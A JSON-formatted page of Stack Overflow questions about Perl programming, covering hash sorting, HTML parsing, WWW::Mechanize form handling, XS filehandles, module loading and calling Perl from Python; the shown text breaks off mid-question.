{"total":22324,"page":17,"pagesize":100,"questions":[{"tags":["perl","package","subroutine"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":12504744,"title":"perl list subs in a package, excluding imported subs from other packages","body":"<p>There's several way to list all subs in a package:</p>\n\n<pre><code>sub list_methods {\n    my $package = shift;\n    no strict 'refs';\n    return grep { defined &amp;{\"$package\\::$_\"} } keys %{\"$package\\::\"}\n}\n</code></pre>\n\n<p>But, if the package 'use' other packages such as 'File::Basename', the subs like 'fileparse' will be listed as well.\nI tried to 'require' packages instead of 'use' them, the problem can be resolved. On the other hand, if I 'require' packages, I have to specify the full path of the subs.</p>\n\n<p>Do you have any thoughts?</p>\n"},{"tags":["perl","wampserver"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":60,"score":0,"question_id":12504610,"title":"Running BioPerl scripts in Wampserver","body":"<p>I am creating a page using wampserver on windows and work it locally. I want to access database Ensemble to obtain some useful info, such as a gene's sequence, and i'm running into the following problem:</p>\n\n<p>I have installed ActivePerl and the API's required and my bioperl script runs perfectly from command prompt.</p>\n\n<p>As fas as the wampserver is concerned, i have modifies httpd.conf in Apache to run perl scripts. A simple perl script (e.g hello world) i can executed through wamp. (i stored id on www and go localhost/hello.pl)</p>\n\n<p>When i want to run the script in wampserver for obtaining the sequence (more complex of course) i get this error: </p>\n\n<blockquote>\n  <p>install_driver(mysql) failed: Can't locate DBD/mysql.pm in @INC (@INC contains: C:/wamp/bin/Perl/lib C:/wamp/bin/Perl/site/lib . C:/src/ensembl/modules) at (eval 8) line 3.\n  Perhaps the DBD::mysql perl module hasn't been fully installed,\n  or perhaps the capitalisation of 'mysql' isn't right.\n  Available drivers: DBM, ExampleP, File, Gofer, Proxy, Sponge.\n   at C:/src/ensembl/modules/Bio/EnsEMBL/Registry.pm line 1594</p>\n</blockquote>\n\n<p>In command prompt window the script runs. How can i manage it to run it in wampserver??</p>\n\n<p>Thanks for your help in advance</p>\n"},{"tags":["perl","sorting","hash","hashes"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":12503657,"title":"Sorting a hash by the value and then part of the key in Perl","body":"<p>I have a hash of names and ranks (keys) and a number (value) with the format:</p>\n\n<pre><code>\"\\nName\\nSecondName\\nRank: 12345/150000\" =&gt; 100\n\n\"\\nThirdName\\nFourthName\\nRank: 24567/150000\" =&gt; 71\n\n\"\\nFifthName\\nSixthName\\nRank: 10101/150000\" =&gt; 71\n</code></pre>\n\n<p>and so on 150,000 times...</p>\n\n<p>With Perl, I would like to sort the hash primarily by the value number, and then secondarily by the first number of the rank, to look like this:</p>\n\n<pre><code>\"\\nName\\nSecondName\\nRank: 12345/150000\" =&gt; 100\n\n\"\\nFifthName\\nSixthName\\nRank: 10101/150000\" =&gt; 71\n\n\"\\nThirdName\\nFourthName\\nRank: 24567/150000\" =&gt; 71\n</code></pre>\n"},{"tags":["html","perl","post","iframe"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":62,"score":0,"question_id":12502015,"title":"Using FORM to POST into iframe HTML/PERL/PHP","body":"<p>I am trying to use a <code>&lt;form&gt;</code> to <code>POST</code> a date from datepicker into an <code>&lt;iframe&gt;</code>. I am using Perl and HTML for the iframe. Below is my code. I can either get the iframe to change to the correct page or to send (ie. <code>POST</code>) the data from the form. Not both together. Please help.</p>\n\n<pre><code>&lt;!-- Form to post query to iframe --&gt;\n&lt;div class=\"demo\"&gt;\n  &lt;form id=\"upload_date_form\"\n        src=\"#\"\n        target=\"iframeTarget\"\n        method=\"POST\"\n        action=\"inputQuery.cgi\"\n  &gt; \n    &lt;label for=\"from\"&gt;From:&lt;/label&gt;\n    &lt;input type=\"text\" id=\"from\" name=\"from\"/&gt;\n    &lt;label for=\"to\"&gt;To:&lt;/label&gt;\n    &lt;input type=\"text\" id=\"to\" name=\"to\"/&gt;\n    &lt;input type=\"button\" name=\"subbtn\"\n           onClick=\"openNewArticle(); return false\" value=\"Submit to Query\"/&gt;\n  &lt;/form&gt;\n  &lt;!-- onClick=\"openNewArticle(); return false\"--&gt;\n\n  &lt;!-- Script for Button and iframe --&gt;\n  &lt;script type=\"text/javascript\"&gt;\n    var src = \"\";\n    function openNewArticle(){\n      document.getElementById(\"display\").src= \"inputQuery.cgi\";\n    }Â \n  &lt;/script&gt;\n\n  &lt;iframe class=\"iframe\"\n          src=\"preQuery.php\"\n          name=\"iframeTarget\"\n          height=\"900\" width=\"100%\"\n          frameborder=\"0\"\n          id=\"display\"\n          scrolling=\"auto\"\n  &gt;&lt;/iframe&gt;\n&lt;/div&gt;\n</code></pre>\n"},{"tags":["perl","directories"],"answer_count":4,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":7718,"score":5,"question_id":701458,"title":"How can I create a directory if one doesn't exist using Perl?","body":"<p>Currently, my Perl output is hard-coded to dump into the following UNIX directory:</p>\n\n<pre><code>my $stat_dir = \"/home/courses/\".**NEED DIR VAR HERE**;\n</code></pre>\n\n<p>The filename is built as such:</p>\n\n<pre><code>$stat_file = $stat_dir . \"/\".$sess.substr($yr, 2, 2).\"_COURSES.csv\";\n</code></pre>\n\n<p>I need a similar approach to building UNIX directories, but need to check if they exist first before creating them.</p>\n\n<p>BONUS EXTRA CREDIT WIN: <br>Auto-numbering (revisions) of the $stat_file so that when these files get pumped into the same directory, they do not overwrite or append to existing files in the directory. (I don't know if this question has been fielded yet on S.O. - sorry if its a re-post)</p>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":633,"score":3,"question_id":3493593,"title":"How do I evaluate shell variables in a string?","body":"<p>In my Perl script I get strings of file paths that may contain environment variables, e.g. <code>$FONTS/test.ttf</code> or <code>$TMP/file.txt</code>.</p>\n\n<p>I now want to open those files like this: </p>\n\n<pre><code>open my $handle, \"&lt;$filename\" or die $!;\n</code></pre>\n\n<p>How can I now expand the environment variables prior to the open call, as e.g. the bash shell would do?</p>\n"},{"tags":["perl"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":3,"view_count":84,"score":-3,"question_id":12499661,"title":"Difficulty with global symbols and explicit package names","body":"<p>I'm in need of help debugging the code shown below. I've asked similar versions of this question, but I haven't been able to develop a script that works. My input file is like this:</p>\n\n<blockquote>\n  <p>line1<br>\n  AAAAAAAAAAAAAAA<br>\n  line2<br>\n  BBBBBBBBBBBBBBB<br>\n  line3<br>\n  CCCCCCCCCCCCCCC<br>\n  line4<br>\n  DDDDDDDDDDDDDDD</p>\n</blockquote>\n\n<p>I would like the script to randomly shuffle the lines in the file, such as:</p>\n\n<blockquote>\n  <p>line2<br>\n      BBBBBBBBBBBBBBB<br>\n  line1<br>\n      AAAAAAAAAAAAAAA<br>\n  line4<br>\n      DDDDDDDDDDDDDDD<br>\n  line3<br>\n      CCCCCCCCCCCCCCC</p>\n</blockquote>\n\n<p>The file has quite a few lines in it (~1,000,000). Currently, I get the following errors:</p>\n\n<pre><code>Global symbol \"$header_size\" requires explicit package name at fasta_corrector9.pl line 40.\n</code></pre>\n\n<p>and</p>\n\n<pre><code>Global symbol \"$header_size\" requires explicit package name at fasta_corrector9.pl line 47.\n</code></pre>\n\n<p>I don't understand how to give <code>$header_size</code> an explicit package name. I'm not a programmer, so I'll need very basic explanations. Thanks in advance.</p>\n\n<pre><code>#! /usr/bin/perl\n\nuse strict;\nuse warnings;\n\nprint \"Please enter filename (without extension): \";\nmy $input = &lt;&gt;;\nchomp($input);\n\nprint \"Please enter total no. of sequence in fasta file: \";\nmy $orig_size = &lt;&gt; * 2 - 1;\nchomp($orig_size);\n\nopen(INFILE, \"$input.fasta\") or die \"Error opening input file for shuffling!\";\nopen(SHUFFLED, \"&gt;\" . \"$input\" . \"_shuffled.fasta\")\n    or die \"Error creating shuffled output file!\";\n\nmy @array  = (0);    # Need to initialise 1st element in array1&amp;2 for the shift function\nmy @array2 = (0);\nmy $i      = 1;\nmy $index  = 0;\nmy $index2 = 0;\n\nwhile (my @line = &lt;INFILE&gt;) {\n    while ($i &lt;= $orig_size) {\n\n        $array[$i] = $line[$index];\n        $array[$i] =~ s/(.)\\s/$1/seg;\n\n        $index++;\n        $array2[$i] = $line[$index];\n        $array2[$i] =~ s/(.)\\s/$1/seg;\n\n        $i++;\n        $index++;\n    }\n}\n\nmy $array  = shift(@array);\nmy $array2 = shift(@array2);\nfor $i (reverse 0 .. $header_size) {\n    my $j = int rand($i + 1);\n    next if $i == $j;\n    @array[$i,  $j] = @array[$j,  $i];\n    @array2[$i, $j] = @array2[$j, $i];\n}\n\nwhile ($index2 &lt;= $header_size) {\n    print SHUFFLED \"$array[$index2]\\n\";\n    print SHUFFLED \"$array2[$index2]\\n\";\n    $index2++;\n}\nclose(INFILE);\nclose(SHUFFLED);\n</code></pre>\n"},{"tags":["perl","split"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":74,"score":3,"question_id":12500887,"title":"Separator Retention Mode in perl split()","body":"<pre><code>split /PATTERN/,EXPR\n</code></pre>\n\n<p>I read the following in a book,</p>\n\n<blockquote>\n  <p>When you use a pattern in <strong>split</strong>, be sure to avoid memory parantheses\n  in the pattern since these trigger seperator retention mode.</p>\n</blockquote>\n\n<p>I can't seem to find the documentation which explains this in detail. Could someone please explain <strong>Seperator Retention Mode</strong> and its possible usage briefly?</p>\n"},{"tags":["arrays","perl","hash"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":65,"score":0,"question_id":12497815,"title":"perl find size of an array of hash","body":"<p>how do you get the size of this array of hashes. I thought this will do it but it did not work....  </p>\n\n<pre><code>print Dumper scalar $item-&gt;{'detail'};  \n$VAR1 = [ \n { 'content' =&gt; undef, 'name' =&gt; 'entree', 'url_name' =&gt; 'entree' },\n { 'content' =&gt; undef, 'name' =&gt; 'dessert', 'url_name' =&gt; 'desert' }, \n { 'content' =&gt; undef, 'name' =&gt; 'drink', 'url_name' =&gt; 'drink' } \n];  \n</code></pre>\n\n<p>or how can i print all the url_name (entree, desert, drink) in the array of hashes without knowing the size? </p>\n"},{"tags":["perl","html-parsing"],"answer_count":3,"favorite_count":2,"up_vote_count":7,"down_vote_count":0,"view_count":338,"score":7,"question_id":12401684,"title":"How to move up a node in html tree and extract the link?","body":"<p>I know my question title is not that descriptive but let me explain here.</p>\n\n<p>I am trying to parse the given <a href=\"http://sprunge.us/RKJF\" rel=\"nofollow\">html document</a> using HTML::TreeBuilder. Now in this html document values <code>5,1,ABC,DEF</code> are to be validated against the user supplied value and if that validation successfull I have to extract <code>href</code> link.</p>\n\n<p>So, my code is :</p>\n\n<pre><code>my @tag = $tree-&gt;look_down( _tag =&gt; 'tr', class =&gt; qr{\\bepeven\\scompleted\\b} );\nfor (@tag) {\n\n    query_element($_);\n}\n\nsub query_element {\n\n    my @td_tag = $_[0]-&gt;look_down( _tag =&gt; 'td' );\n\n    my $num1 = shift @td_tag; #Get the first td tag\n    my $num2 = shift @td_tag; # Get the second td tag\n\n\n    #Making sure first/second td tag has numeric value\n    $num1 = $1 if $num1-&gt;as_text =~ m!(\\d+)! or die \"no match found\";\n    $num2 = $1 if $num2-&gt;as_text =~ m!(\\d+)! or die \"no match found\";\n\n\n    #Validating that above value's match the user provided value 5 and 1.\n    if ( $num1 eq '5' &amp;&amp; $num2 eq '1' ) { \n        say \"hurray..!!\";\n\n        #Iterating over rest of the td tag to make sure we get the right link from it.\n        for (@td_tag) {\n\n            #Check if contains ABC and than procede to fetch the download href link.\n            if ($_-&gt;look_down(_tag  =&gt; 'td', class =&gt; qr{[c]}, sub {\n                        $_[0]-&gt;as_text eq 'ABC';} )\n            )   \n            {   \n                my $text = $_-&gt;as_text;\n                say \"Current node text is: \", $text; #outputs ABC\n\n                #Now from here how do I get the link I want to extract.\n            }\n        }\n    }\n}\n</code></pre>\n\n<p>Now, my approach is first extract the value from <code>td tags</code> and match it against the user specified value if it is a success than look for another user specified value either <code>ABC or DEF</code> in my case it is <code>ABC</code> if it matched <strong>than only</strong> extract the link.</p>\n\n<p>Now, tag containig <code>ABC or DEF</code> has no fixed position but they will be below the tags containing <code>5 and 1</code> value. So, I used <code>$_[0]-&gt;as_text eq 'ABC';</code> to chech that the tag contains <code>ABC</code> now in my tree I am currently at <code>text node</code> ABC from here how do I extract the link href i,e how do I move up the object tree and extract value.</p>\n\n<p>PS: I would have tried xpath here but position of html elements is not that well-defined and structured.</p>\n\n<p><strong>EDIT:</strong></p>\n\n<p>So, I tried <code>$_-&gt;tag()</code> and returned <code>td</code> but if I am on td tag than the why the following code doesn't work:</p>\n\n<pre><code>my $link_obj = $_-&gt;look_down(_tag =&gt; 'a') # It should look for `a` tag.\nsay $link_obj-&gt;as_text;\n</code></pre>\n\n<p>But it gives the following error:</p>\n\n<pre><code>Can't call method \"as_text\" on an undefined value.\n</code></pre>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":105,"score":3,"question_id":12500095,"title":"How to navigate Web Pages in Perl using WWW::Mechanize and dropdowns?","body":"<p>I am having a problem, what i am trying to do is:</p>\n\n<p>I open a webpage with WWW::Mechanize, fill the username and password and log in.</p>\n\n<p>The issue I am having is, after logging in I have to select the value from a dropdown list\nand after that I have to press submit.</p>\n\n<p>How can i do that?</p>\n\n<p>The code which i have used is:</p>\n\n<pre><code>#!/usr/bin/perl\nuse LWP::UserAgent;\nuse  WWW::Mechanize;\nuse HTTP::Cookies;\nuse strict;\n\nmy $username=\"123456\";\nmy $password=\"XXXXX\";\nmy $project=\"Systems\";\nmy $agent = WWW::Mechanize-&gt;new();\n$agent-&gt;get('http://www.XXXXX.com');\n$agent-&gt;form_name(\"login_form\");\n$agent-&gt;field(\"txtLoginId\", $username);\n$agent-&gt;field(\"txtPassword\", $password);\n$agent-&gt;submit();\n#Till now it has success full logined, From here it has to select one value from a drop #down box\n$agent-&gt;form_name(\"frmProject\");\n$agent-&gt;field(\"cboProject\", $project);\nmy $response=$agent-&gt;submit();\n\nif ($response-&gt;is_success){\n  print \"\\nContent:\\n\";\n  print $response-&gt;as_string;\n}elsif ($response-&gt;is_error){\n  print $response-&gt;error_as_HTML;\n}\n</code></pre>\n"},{"tags":["linux","perl","system","io-redirection"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":137,"score":0,"question_id":7394045,"title":"Redirecting output of system calls with perl in an initramfs","body":"<p>I've got this perl script that runs with the initramfs.  I've come across a bunch of little problems I don't understand that are surely related to the shell.  The particular one I'm asking about is this:</p>\n\n<pre><code>system(\"/sbin/e2fsck -f $dev\");\n\nsystem(\"/sbin/e2fsck -f $dev &gt;/dev/null\");\n</code></pre>\n\n<p>The one redirecting to /dev/null fails. Ultimately, I want to be grabbing the output:</p>\n\n<pre><code>open IN, \"/sbin/e2fsck -f $dev |\";\n</code></pre>\n\n<p>But this fails too.</p>\n\n<p>Here's the answer:\n e2fsck needs a terminal for interactive repair.  Passing the -y flag fixed that.   Thanks.</p>\n"},{"tags":["perl","xs"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":39,"score":2,"question_id":12497870,"title":"Ho to work with pseudo-filehandles in Perl XS code?","body":"<p>I am trying to write XS glue code for a serialization/deserialization library that is able to work with anything that provides a <code>write(ctx, buffer, count)</code>/<code>read(ctx, buffer, count)</code> interface. I'd like to be able to use pseudo-filehandles that I get with</p>\n\n<pre><code>open $reader, '&lt;', $in;\nopen $writer, '&gt;', $out;\n</code></pre>\n\n<p>so using a <code>FILE*</code> mapping does not seem to work. Since I did not find any good documentation, I played around and arrived at  the following XS snippet:</p>\n\n<pre><code>void\nwrite_buf (fh, string);\nINPUT:\nPerlIO* fh;\nSV* string;\nCODE:\nSTRLEN length = SvLEN (string);\nchar* buf = SvPV (string, length);\nPerlIO_write (fh, buf, length);\n</code></pre>\n\n<p>It seems to do what I want, but is this the proper way of handling everything that Perl may consider a filehandle in XS code?</p>\n"},{"tags":["mysql","perl","apache","freebsd","dbi"],"answer_count":0,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":104,"score":2,"question_id":12379257,"title":"Detecting hanging processes in Perl/MySQL (FreeBSD)","body":"<p>I have a Perl script running on a FreeBSD/Apache system, which makes some simple queries to a MySQL database via DBI.  The server is fairly active (150k pages a day) and every once in a while (as much as once a minute) something is causing a process to hang.  I've suspected a file lock might be holding up a read, or maybe it's a SQL call, but I have not been able to figure out how to get information on the hanging process.</p>\n\n<p>Per Practical mod_perl it sounds like the way to identify the operation giving me the headache is either system trace, perl trace, or the interactive debugger.  I gather the system trace is ktrace on FreeBSD, but when i attach to one of the hanging processes in top, the only output after the process is killed is:</p>\n\n<p>50904 perl5.8.9 PSIG  SIGTERM SIG_DFL</p>\n\n<p>That isn't very helpful to me.  Can anyone suggest a more meaningful approach on this?  I am not terribly advanced in Unix admin, so your patience if I sound stupid is greatly appreciated....  :o)</p>\n"},{"tags":["regex","perl","awk"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":80,"score":0,"question_id":12484636,"title":"regular expression to search and replace, starting after only n matches","body":"<p>I want to search and replace a simple string starting only after so many matches on each line, for example:</p>\n\n<p>s/ZZ/YY for n=2</p>\n\n<pre><code>xxxZZxxxxxxZZxxxxZZxZZxxxxZZ\nxZZxxxZZxxZZxxZZxZZxxxZZxxx\n...\n</code></pre>\n\n<p>into:</p>\n\n<pre><code>xxxZZxxxxxxZZxxxxxYYxxxxYY\nxZZxxxZZxxYYxxYYxYYxxxYYxxx\n...\n</code></pre>\n\n<p>In my problem there will always be an 'x' in between sequential \"ZZ\"s. Thanks in advance.</p>\n"},{"tags":["python","perl","command","subprocess","popen"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":12496170,"title":"call perl script from python works in commands.getstatusoutput but not in subprocess.call","body":"<p>I have a python script which must call a perl script to get data from a remote server.\nThe perl script has to stay perl, it's third party and I don't have any options there.\nI'm trying to remove all the obsolete and deprecated stuff that the previous developer stuck all around the code, so I'd like to replace the commands.getstatusoutput call with a subprocess call, but somehow I can't seem to get it to work...</p>\n\n<p>Up until now, the script was called via commands.getstatusoutput(string) where string is the full system call to the perl script, as in '/usr/bin/perl /path/to/my/perl/script.pl &lt; /path/to/my/input'.</p>\n\n<p>I create a list of arguments (args = ['/usr/bin/perl', '/path/to/my/perl/script.pl', '&lt;', '/path/to/my/input']) and I pass it to subprocess.call:</p>\n\n<pre><code>args = ['/usr/bin/perl', '/path/to/my/perl/script.pl', '&lt;', '/path/to/my/input']\nstrOut = subprocess.call(args)\nprint strOut\n</code></pre>\n\n<p>Unfortunately, this fails with the error :</p>\n\n<pre><code>port absent at /path/to/my/perl/script.pl line 9.\n</code></pre>\n\n<p>The perl script is :</p>\n\n<pre><code>#!/usr/bin/perl\nuse IO::Handle;\nuse strict;\nuse Socket;\nmy ($remote, $port, $iaddr, $paddr, $proto, $ligne);\n$remote = shift || 'my.provider.com';\n$port   = shift || 9000;\nif ($port =~ /\\D/) { $port = getservbyname ($port, 'tcp'); }\ndie \"port absent\" unless $port;\n</code></pre>\n\n<p>Despite reading other similar threads here (<a href=\"http://stackoverflow.com/questions/4682088/call-perl-script-from-python\">Call perl script from python</a>, <a href=\"http://stackoverflow.com/questions/798413/how-to-call-a-perl-script-from-python-piping-input-to-it\">How to call a perl script from python?</a>, <a href=\"http://stackoverflow.com/questions/805160/how-can-i-get-the-results-of-a-perl-script-in-python-script\">How can I get the results of a Perl script in Python script?</a>, <a href=\"http://stackoverflow.com/questions/10202078/python-getstatusoutput-replacement-not-returning-full-output\">Python getstatusoutput replacement not returning full output</a> etc) and elsewhere, I get the feeling I am missing something obvious but I can't work out what.</p>\n\n<p>Any ideas?</p>\n\n<p>Thanks.</p>\n"},{"tags":["regex","perl","delete","extract"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":67,"score":0,"question_id":12487627,"title":"extract the matched regex or delete strings other than the matched regex","body":"<p>I have a file </p>\n\n<pre><code>**data2.l**\ni have a car \nits nissan GTR \nthis car is super fast\n</code></pre>\n\n<p>If i want to delete the word \"car\" from this file i just use</p>\n\n<pre><code>perl -p -i -e \"s/car//ig\" data2.l\n</code></pre>\n\n<p>But if i want to keep \"car\" and delete all other terms other than \"car\"\nIf i try to just extract the \"car\" i am just able to extract the complete line containing \"car\".</p>\n\n<pre><code>**example O/P**\ncar\ncar\n</code></pre>\n\n<p>So can this oneliner be modified a bit to do this task???</p>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":6,"down_vote_count":0,"view_count":182,"score":6,"question_id":7703535,"title":"How this can be done in more perl way","body":"<p>I'm a novice in Perl and for one of my homework I came up with a solution like this : </p>\n\n<pre><code>#wordcount.pl FILE \n    # \n\n    #if no filename is given, print help and exit \n    if (length($ARGV[0]) &lt; 1) \n    { \n           print \"Usage is : words.pl word filename\\n\"; \n           exit; \n    } \n\n   my $file = $ARGV[0];          #filename given in commandline \n\n   open(FILE, $file);            #open the mentioned filename \n   while(&lt;FILE&gt;)                 #continue reading until the file ends \n    { \n           chomp; \n           tr/A-Z/a-z/;          #convert all upper case words to lower case \n           tr/.,:;!?\"(){}//d;            #remove some common punctuation symbols \n           #We are creating a hash with the word as the key.  \n           #Each time a word is encountered, its hash is incremented by 1. \n           #If the count for a word is 1, it is a new distinct word. \n           #We keep track of the number of words parsed so far. \n           #We also keep track of the no. of words of a particular length.  \n\n          foreach $wd (split) \n          { \n                $count{$wd}++; \n                if ($count{$wd} == 1) \n                 { \n                       $dcount++; \n                 } \n                $wcount++; \n                $lcount{length($wd)}++; \n          } \n   } \n\n   #To print the distinct words and their frequency,  \n   #we iterate over the hash containing the words and their count. \n   print \"\\nThe words and their frequency in the text is:\\n\"; \n   foreach $w (sort keys%count) \n   { \n         print \"$w : $count{$w}\\n\"; \n   } \n\n   #For the word length and frequency we use the word length hash \n   print \"The word length and frequency in the given text is:\\n\"; \n   foreach $w (sort keys%lcount) \n   { \n         print \"$w : $lcount{$w}\\n\"; \n   } \n\n   print \"There are $wcount words in the file.\\n\"; \n   print \"There are $dcount distinct words in the file.\\n\"; \n\n   $ttratio = ($dcount/$wcount)*100;       #Calculating the type-token ratio. \n\n   print \"The type-token ratio of the file is $ttratio.\\n\"; \n</code></pre>\n\n<p>I have included the comment to mention what it does. Actually I have to find the word count from the given text file. The output of the above program will look like :</p>\n\n<pre><code>The words and their frequency in the text is: \n1949 : 1\na : 1\nadopt : 1\nall : 2\namong : 1\nand : 8\nassembly : 1\nassuring : 1\nbelief : 1\ncitizens : 1\nconstituent : 1\nconstitute : 1\n.\n.\n.\nThe word length and frequency in the given text is:\n1 : 1\n10 : 5\n11 : 2\n12 : 2\n2 : 15\n3 : 18\nThere are 85 words in the file. \nThere are 61 distinct words in the file. \nThe type-token ratio of the file is 71.7647058823529. \n</code></pre>\n\n<p>Even though with the help of Google I can able to find out the solution for my homework. But however I think that there will be a smaller and concise code using the real power of Perl. Can anyone give me a solution in Perl with much less lines of code?</p>\n"},{"tags":["perl"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":96,"score":1,"question_id":12482535,"title":"perl print only the last line of the array","body":"<p>I am trying to print the array but the out put contain only the last line of the array. the partial code is as follow.</p>\n\n<pre><code>open OUT, \"&gt; /myFile.txt\"\n    or die \"Couldn't open output file: $!\";\n\nforeach (@result) {\n\n    print OUT;\n}\n</code></pre>\n\n<p>the out put is </p>\n\n<pre><code>List Z\n</code></pre>\n\n<p>which is the last line, but when I do <code>print \"@result\"</code> the out put is</p>\n\n<pre><code>List A\n\nList B\n\nList C  so on...\n</code></pre>\n\n<p>I am little bit confuse why the results are different on the same array.</p>\n"},{"tags":["linux","perl","bash","asterisk","init.d"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":2963,"score":3,"question_id":3864877,"title":"How can I set environment variables in my Linux service for Asterisk even though it doesn't have a real user?","body":"<p>I have created a linux service that runs as a deamon (and gets started from /etc/init.d/X). I need to set some environment variables that can be accessed by the application.</p>\n\n<p>Here's the scenario. The application is a bunch of Perl AGI scripts that depend on (and therefore need to run as) asterisk user but asterisk doesn't have a shell. Ideally I'd just set this in <em>/home/asterisk/.bashrc</em> but that doesn't exist for asterisk.</p>\n\n<p>How can I set environment variables for my app in the asterisk user's running environment so that my app can use them?</p>\n"},{"tags":["regex","perl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":88,"score":0,"question_id":12488748,"title":"Flip flop usage during multi \"START\" pattern in Perl","body":"<p>I have a Test.txt file as shown below:</p>\n\n<pre><code>some data1 func-name1 SECTION.\ndata to be extracted\ndata to be extracted\nsome data2 func-name2 SECTION.\ndata to be extracted\ndata to be extracted\nfunc-name2-EXIT. EXIT.\n</code></pre>\n\n<p>Now, I am using flip-flop operator to extract the ranges, where my START=<em>SECTION.</em> and END=<em>-EXIT. EXIT.</em> as below:</p>\n\n<pre><code>open FILE1, \"&lt;Test.txt\" \n    or die \"Cannot open File1.txt!\";\n\nopen FINAL, \"&gt;Final.txt\" \n    or die \"Cannot open Finall.txt!\";\n\nmy $START = 'SECTION.';\nmy $END   = '-EXIT EXIT.';\n\nwhile (&lt;FILE1&gt;) {\n    if (/$START/ .. /$END|$START/) {\n\n        if ($_ =~ m/$END|$START/) {\n            $flag = 1;\n        }\n\n        print FINAL $_;\n\n        if ($flag == 1) {          \n            print FINAL \"\\n\\n\";\n            $flag = 0;\n        }\n    }\n}\nclose FINAL;\nclose FILE1; \n</code></pre>\n\n<p>What I am trying to do is that, I need two next line as delimiters between the <em>SECTION.</em> ranges also and my Final.txt should look like as below:</p>\n\n<pre><code>some data1 func-name1 SECTION.\ndata to be extracted\ndata to be extracted\n\n\nsome data2 func-name2 SECTION.\ndata to be extracted\ndata to be extracted\nfunc-name2-EXIT. EXIT.\n</code></pre>\n\n<p>Please guide me on this.</p>\n"},{"tags":["osx","perl","bash","find"],"answer_count":5,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":134,"score":4,"question_id":10707145,"title":"Find last modified file in a directory with white space","body":"<p>I found and tweaked this script to find the most recently modified file in a directory recursively. It only breaks when there is a space in the directory name. Can anyone help me adjust the script so it will read directories with space also?s</p>\n\n<pre><code>for i in *; do\n\nfind $i -type f | perl -ne 'chomp(@files = &lt;&gt;); my $p = 9; foreach my $f (sort { (stat($a))[$p] &lt;=&gt; (stat($b))[$p] } @files) { print scalar localtime((stat($f))[$p]), \"\\t\", $f, \"\\n\" }' | tail -1\n\ndone\n</code></pre>\n"},{"tags":["perl","oop","inheritance","perl-module","autoload"],"answer_count":1,"favorite_count":2,"up_vote_count":6,"down_vote_count":0,"view_count":154,"score":6,"question_id":12419357,"title":"Perl: Dynamic module loading, object inheritance and \"common helper files\"","body":"<p>In a nutshell I try to model a network topology using objects for every instance in the network. Additionally I got a top-level manager class responsible for, well, managing these objects and performing integrity checks. The filestructure looks like this (I left out most of the object-files as they are all structured pretty equal):</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>Manager.pm\nConstants.pm\nClasses/\n  +- Machine.pm\n  +- Node.pm\n  +- Object.pm\n  +- Switch.pm\n</code></pre>\n\n<p>Coming from quite a few years in OOP, I'm a fan of code reuse etc. so I set up inheritance between thos objects, the inheritance tree (in this example) looks like this:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>Switch  -+-&gt; Node -+-&gt; Object\nMachine -+\n</code></pre>\n\n<p>All those objects are structured like this:</p>\n\n<pre class=\"lang-perl prettyprint-override\"><code>package Switch;\nuse parent qw(Node);\n\nsub buildFromXML {\n  ...\n}\nsub new {\n  ...\n}\n\n# additonal methods\n</code></pre>\n\n<p>Now the interesting part:</p>\n\n<h1>Question 1</h1>\n\n<p>How can I ensure correct loading of all those objects without typing out the names statically?\nThe underlying problem is: If I just <code>require \"$_\" foreach glob(\"./Classes/*\");</code> I get many \"Subroutine new redefined at\" errors. I also played around with <code>use parent qw(-norequire Object)</code>, <code>Module::Find</code> and some other <code>@INC</code> modifications in various combinations, to make it short: It didn't work. Currently I'm statically importing all used classes, they auto-import their parent classes.<br>\nSo basically what I'm asking: What is the (perl-)correct way of doing this?<br>\nAnd advanced: It would be very helpful to be able to create a more complex folder structure (as there will be quite a few objects) and still have inheritance + \"autoloading\"</p>\n\n<h1>Question 2 - <strong>SOLVED</strong></h1>\n\n<p>How can I \"share my imports\"? I use several libraries (my own, containing some helper functions, <code>LibXML</code>, <code>Scalar::Util</code>, etc.) and I want to share them amongst my objects. (The reasoning behind that is, I may need to add another common library to all objects and chances are high that there will be well above 100 objects - no fun editing all of them manually and doing that with a regex / script would theoretically work but that doesn't seem like the cleanest solution available)<br>\nWhat I tried:</p>\n\n<ul>\n<li>import everything in <code>Manager.pm</code> -> Works inside the Manager package - gives me errors like \"undefined subroutine &amp;Switch::trace called\"</li>\n<li>Create a <code>include.pl</code> file and <code>do</code>/<code>require</code>/<code>use</code> it inside every object - gives me the same errors. </li>\n<li>Some more stuff I sadly don't remember</li>\n</ul>\n\n<p><code>include.pl</code> basically would look like that:\n</p>\n\n<pre><code>use lib_perl;\nuse Scalar::Util qw(blessed);\nuse XML::LibXML;\nuse Data::Dumper;\nuse Error::TryCatch;\n...\n</code></pre>\n\n<p>Again I ask: What's the correct way to do it? Am I using the right approach and just failing at the execution or should I change my structure completely?<br>\nIt doesn't matter that much why my current code doesn't work that well, providing a correct, clean approach for those problems would be enough by far 